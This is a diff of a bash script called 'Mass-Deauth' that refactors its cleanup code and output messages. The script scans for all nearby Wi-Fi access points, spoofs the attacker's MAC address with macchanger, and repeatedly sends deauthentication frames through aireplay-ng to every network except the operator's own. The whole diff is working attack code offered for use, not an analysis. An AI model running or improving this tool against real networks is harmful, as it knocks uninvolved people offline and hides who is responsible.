@@ -9,30 +9,32 @@ waitTime="30" # Time to wait before refreshing attack
 MIFACE="mon0"  # monitor interface
 WIFACE="wlp3s0u1"  # wireless card's interface
 DEAUTHS="10" # number of deauths to send; 0 = Infinite
-ourAPmac="5c:57:1a:cd:0c:61"  # our own AP's MAC address; so we don't own our own AP
+ourAPmac="5C:57:1A:CD:0C:61"  # our own AP's MAC address; so we don't own our own AP
 
 ########################### LOGICAL STUFF - don't touch unless you're 31337
 version="0.1"
 atk="0"
+
+clear
 echo -e "\e[01;32m[>]\e[00m Setting up for attack..."
 
-trap cleanup INT
+function rmlogs() {
+	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
+	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
+	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
+}
 function cleanup() {
 	xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Killing deauths..." -e "killall -9 aireplay-ng"
 	airmon-ng stop $MIFACE
-	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
-	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
-	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi	
+	rmlogs
 	exit 0
 }
 
+trap cleanup INT
+
 ip link set $WIFACE up
 
-if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
-if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
-if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
-
-# moncheck=`iw dev | grep $MIFACE | awk '{print $2}'`
+rmlogs
 
 xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Start $WIFACE" -e "ip link set $WIFACE up" &
 
@@ -42,7 +44,7 @@ while [ ! $moncheck ]; do
 	moncheck=`iw dev | grep $MIFACE | awk '{print $2}'`
 done
 
-echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
+echo -e "\e[01;32m[>]\e[00m Changing MAC Address...\n"
 xterm -geometry 75x8+100+0 -T "Mass-Deauth v$version - Changing MAC Address of $MIFACE" -e "ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up" &
 sleep 3
 scan1="0"
@@ -50,14 +52,12 @@ scan1="0"
 while true; do
 	curLine="1"
 	x="1"
-	echo -e "\e[01;32m[>]\e[00m[!] Press [ CTRL+C ]  in this Window to Kill Attack..."
+	echo -e "\e[01;33m[!] Press [ CTRL+C ]  in this Window to Kill Attack...\e[00m\n"
 	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
-	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
-	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
-	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
+	rmlogs
 	iwlist $WIFACE scan > /tmp/scan.tmp
 	sleep 3
-	cat /tmp/scan.tmp | grep "Address:" | grep -v $ourAPmac | cut -b 30-60 > /tmp/APmacs.lst
+	cat /tmp/scan.tmp | grep "Address:" | grep -ivF "$ourAPmac" | cut -b 30-60 > /tmp/APmacs.lst
 	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
 	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
 	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
